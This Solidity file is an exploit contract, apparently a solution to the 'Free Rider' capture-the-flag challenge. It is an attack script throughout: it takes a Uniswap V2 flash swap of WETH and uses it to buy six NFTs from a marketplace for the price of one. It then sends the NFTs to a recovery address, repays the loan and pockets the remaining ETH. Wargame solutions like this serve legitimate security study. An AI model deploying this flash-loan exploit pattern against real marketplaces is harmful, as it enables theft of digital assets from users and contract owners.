pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";
interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Factory {
    function getPair(address token0, address token1) view external returns (address);
}

interface IUniswapV2Pair {
    function token0() view external returns (address);
    function token1() view external returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address spender, bytes calldata data) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount, bytes calldata data) external returns (bool);
}

interface IERC721 {
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory data) external;
}
 
interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function approve(address spender, uint value) external returns (bool);
    function balanceOf(address owner) external view returns (uint);
}

interface Marketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

// https://medium.com/buildbear/flash-swap-5bcdbd9aaa14

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {

    using Address for address payable;

    IUniswapV2Pair pair;
    IWETH weth;
    IERC20 token;
    IERC721 nft;
    Marketplace marketplace;
    address recovery;

    constructor(address pair_, address weth_, address token_, address marketplace_, address nft_, address recovery_) {
        pair = IUniswapV2Pair(pair_);
        weth = IWETH(weth_);
        token = IERC20(token_);
        nft = IERC721(nft_);
        marketplace = Marketplace(marketplace_);
        recovery = recovery_;
    }

    function attack() external {
        uint256 amount0Out = 15 ether;
        bytes memory data = abi.encode(address(weth), amount0Out);

        IUniswapV2Pair(pair).swap(amount0Out, 0, address(this), data);
    }

    // Called by pair contract when flesh swap is started
    // Called only if durring `swap` call, `data` field is not empty
    function uniswapV2Call(address sender, uint256, uint256, bytes calldata data) external override {
        require(msg.sender == address(pair), "Caller not pair contract");
        require(sender == address(this), "Invalid sender");

        (address tokenBorrowed, uint256 amount) = abi.decode(data, (address, uint256));

        console.log("WETH Contract balance: ", weth.balanceOf(address(this)));
        weth.withdraw(15 ether);
        console.log("Current balance before NFT buying: ", address(this).balance / 1E18);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: 15 ether}(tokenIds);
        console.log("Current balance after NFT buying: ", address(this).balance / 1E18);
        
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                recovery,
                i,
                abi.encode(address(this))
            );
        }

        // 0.3% swap fee for every swap
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        weth.deposit{value: amountToRepay}();
        console.log("Current balance after WETH depositing: ", address(this).balance / 1E18);

        payable(tx.origin).sendValue(address(this).balance);
        IERC20(tokenBorrowed).transfer(address(pair), amountToRepay);
    }

    function onERC721Received(address, address, uint256, bytes memory)
        external
        pure
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}